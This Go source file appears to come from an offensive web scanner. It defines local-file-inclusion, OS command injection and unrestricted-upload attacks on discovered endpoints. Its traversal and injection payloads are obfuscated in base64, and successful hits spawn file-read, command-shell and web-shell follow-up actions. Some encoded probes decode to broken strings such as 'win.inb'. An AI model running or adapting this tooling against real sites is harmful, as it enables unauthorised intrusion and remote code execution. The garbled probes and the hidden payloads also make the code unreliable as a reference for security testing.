package hacker

import (
	"context"
	"encoding/base64"
	"fmt"
	"strings"

	"github.com/NICE-DEV226/nice-Scan/internal/transport"
	"github.com/NICE-DEV226/nice-Scan/internal/types"
)

type LFIAction struct{}

func (a *LFIAction) Metadata() ActionMetadata {
	return ActionMetadata{
		Name:        "LFI Scanner",
		Description: "Path traversal tests on discovered endpoints",
		Priority:    65,
		Requires:    []string{"has_api"},
		Provides:    []string{"has_lfi"},
	}
}

// the loop used to base64-decode the same constant list on every request).
var lfiProbes = func() (out []string) {
	for _, b64p := range []string{
		"Li4vLi4vLi4vZXRjL3Bhc3N3ZA==",
		"Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==",
		"Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==",
		"Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==",
		// absolute forms also reach servers that reject the relative walk
		"L2V0Yy9wYXNzd2Q=",
		"Li4vLi4vLi4vd2luZG93cy93aW4uaW5p",
		"Li4vLi4vLi4vLi4vd2luZG93cy93aW4uaW5i",
		"Li4vLi4vLi4vLi4vZXRjL3dpbi5pbmktbGlrZT0=",
	} {
		p, err := base64.StdEncoding.DecodeString(b64p)
		if err == nil {
			out = append(out, string(p))
		}
	}
	return out
}()

func (a *LFIAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
	var findings []Finding
	var spawned []Action

	endpoints := kb.GetEndpoints()
	for _, ep := range endpoints {
		params := extractURLParams(ep.Path)
		if !hasFileParam(ep.Path) && len(params) == 0 {
			continue
		}

		for _, param := range params {
			base := ep.Path
			if strings.Contains(base, "?") {
				parts := strings.SplitN(base, "?", 2)
				base = parts[0]
			}

			// Neutral round first: the baseline gate needs what this page
			// prints WITHOUT any traversal. A page that quotes passwd
			// records in its own text (tutorials, docs) must not lend
			// them to a payload echo.
			baselineBody := ""
			if baseResp, err := client.Do(ctx, &types.Request{Method: "GET", URL: base + "?" + param + "="}); err == nil && baseResp != nil {
				baselineBody = string(baseResp.Body)
			}

			for _, probe := range lfiProbes {
				select {
				case <-ctx.Done():
					return ActionResult{Findings: findings, Actions: spawned}
				default:
				}

				testURL := base + "?" + param + "=" + probe
				resp, err := client.Do(ctx, &types.Request{
					Method: "GET",
					URL:    testURL,
				})
				if err != nil {
					continue
				}

				// The only confirmation: a structural record the baseline
				// cannot echo. Keywords + length were the review's
				// tutorial-page false-positive class.
				hit := lfiShapeHit(string(resp.Body), baselineBody)
				if hit == "" {
					continue
				}

				findings = append(findings, Finding{
					Type:        "lfi_confirmed",
					Name:        fmt.Sprintf("LFI: param %s reads structural file record", param),
					Severity:    SevCritical,
					Description: fmt.Sprintf("Local file inclusion at param '%s' — record `%s` matched, absent from the baseline round", param, hit),
					Evidence:    hit + " @ " + testURL,
				})
				spawned = append(spawned, &LFIReadAction{
					vulnURL: testURL,
					param:   param,
				})
				break
			}
		}
	}

	return ActionResult{Findings: findings, Actions: spawned}
}

func hasFileParam(path string) bool {
	lowPath := strings.ToLower(path)
	indicators := []string{"file", "path", "dir", "include", "doc", "pg", "page", "root"}
	for _, ind := range indicators {
		if strings.Contains(lowPath, ind) {
			return true
		}
	}
	return false
}

type CMDInjectAction struct{}

func (a *CMDInjectAction) Metadata() ActionMetadata {
	return ActionMetadata{
		Name:        "CMD Injection",
		Description: "OS command injection tests via parameters",
		Priority:    70,
		Requires:    []string{"has_api"},
		Provides:    []string{"has_rce"},
	}
}

var cmdPayloadsB64 = []struct {
	name    string
	payload string
}{
	{name: "Basic id", payload: "OyBpZA=="},
	{name: "Pipe id", payload: "fCBpZA=="},
	{name: "And id", payload: "JiYgaWQ="},
	{name: "Backtick", payload: "YHdob2FtaWA="},
	{name: "Subshell", payload: "JCh3aG9hbWkp"},
}

var cmdIndicatorsB64 = []string{
	"dWlkPQ==",
	"Z2lkPQ==",
	"cm9vdA==",
	"d3d3LWRhdGE=",
}

func (a *CMDInjectAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
	var findings []Finding
	var spawned []Action

	endpoints := kb.GetEndpoints()
	testTargets := endpoints

	if len(testTargets) == 0 {
		pages := kb.GetPages()
		for _, p := range pages {
			for _, param := range extractURLParams(p.URL) {
				f, u := testCMDPayload(ctx, client, p.URL, param)
				if f != nil {
					findings = append(findings, *f)
					spawned = append(spawned, &CMDShellAction{vulnURL: u, param: param})
				}
			}
		}
		return ActionResult{Findings: findings, Actions: spawned}
	}

	for _, ep := range testTargets {
		for _, param := range extractURLParams(ep.Path) {
			f, u := testCMDPayload(ctx, client, ep.Path, param)
			if f != nil {
				findings = append(findings, *f)
				spawned = append(spawned, &CMDShellAction{vulnURL: u, param: param})
			}
		}
	}

	return ActionResult{Findings: findings, Actions: spawned}
}

func testCMDPayload(ctx context.Context, client *transport.Client, baseURL, param string) (*Finding, string) {
	for _, cmd := range cmdPayloadsB64 {
		payload, err := base64.StdEncoding.DecodeString(cmd.payload)
		if err != nil {
			continue
		}

		testURL := baseURL
		if strings.Contains(testURL, "?") {
			testURL += "&" + param + "=" + string(payload)
		} else {
			testURL += "?" + param + "=" + string(payload)
		}

		resp, err := client.Do(ctx, &types.Request{
			Method: "GET",
			URL:    testURL,
		})
		if err != nil {
			continue
		}

		if hasCMDInjection(string(resp.Body)) {
			return &Finding{
				Type:        "cmd_injection",
				Name:        fmt.Sprintf("CMD injection: %s via %s", cmd.name, param),
				Severity:    SevCritical,
				Description: "OS command execution confirmed",
				Evidence:    testURL,
			}, testURL
		}
	}
	return nil, ""
}

func hasCMDInjection(body string) bool {
	lowBody := strings.ToLower(body)
	for _, b64ind := range cmdIndicatorsB64 {
		ind, err := base64.StdEncoding.DecodeString(b64ind)
		if err != nil {
			continue
		}
		if strings.Contains(lowBody, strings.ToLower(string(ind))) {
			return true
		}
	}
	return false
}

type UploadAction struct{}

func (a *UploadAction) Metadata() ActionMetadata {
	return ActionMetadata{
		Name:        "Upload Exploitation",
		Description: "Test upload endpoints for unrestricted file upload",
		Priority:    75,
		Requires:    []string{"has_upload"},
		Provides:    []string{"has_upload_exploit"},
		// State-changing (uploads arbitrary files). Only when an upload
		// endpoint was actually observed (e.g. a form with a file input
		// field was fetched), never from page-text hints.
		Sensitive: true,
	}
}

func (a *UploadAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
	var findings []Finding
	var spawned []Action

	pages := kb.GetPages()
	for _, page := range pages {
		if !hasFileParam(page.URL) {
			continue
		}

		uploads := []struct {
			filename string
			ctype    string
		}{
			{"test.php", "application/x-php"},
			{"test.php5", "application/x-php"},
			{"test.phtml", "application/x-php"},
			{"test.aspx", "text/plain"},
			{"test.jsp", "text/plain"},
			{"test.php.jpg", "image/jpeg"},
		}

		for _, up := range uploads {
			select {
			case <-ctx.Done():
				return ActionResult{Findings: findings, Actions: spawned}
			default:
			}

			resp, err := client.Do(ctx, &types.Request{
				Method: "POST",
				URL:    page.URL,
				Body:   []byte("test"),
				Headers: map[string]string{
					"Content-Disposition": fmt.Sprintf(`form-data; name="file"; filename="%s"`, up.filename),
					"Content-Type":        up.ctype,
				},
			})
			if err != nil {
				continue
			}

			body := string(resp.Body)
			if resp.StatusCode == 200 || resp.StatusCode == 201 || resp.StatusCode == 302 {
				if !strings.Contains(strings.ToLower(body), "error") && !strings.Contains(strings.ToLower(body), "invalid") {
					findings = append(findings, Finding{
						Type:        "upload_confirmed",
						Name:        fmt.Sprintf("Upload vulnerable: %s", up.filename),
						Severity:    SevCritical,
						Description: "File upload accepted — potential RCE via web shell",
						Evidence:    fmt.Sprintf("Filename: %s", up.filename),
					})
					spawned = append(spawned, &WebShellAction{
						uploadURL: page.URL,
						filename:  up.filename,
					})
					break
				}
			}
		}
	}

	return ActionResult{Findings: findings, Actions: spawned}
}
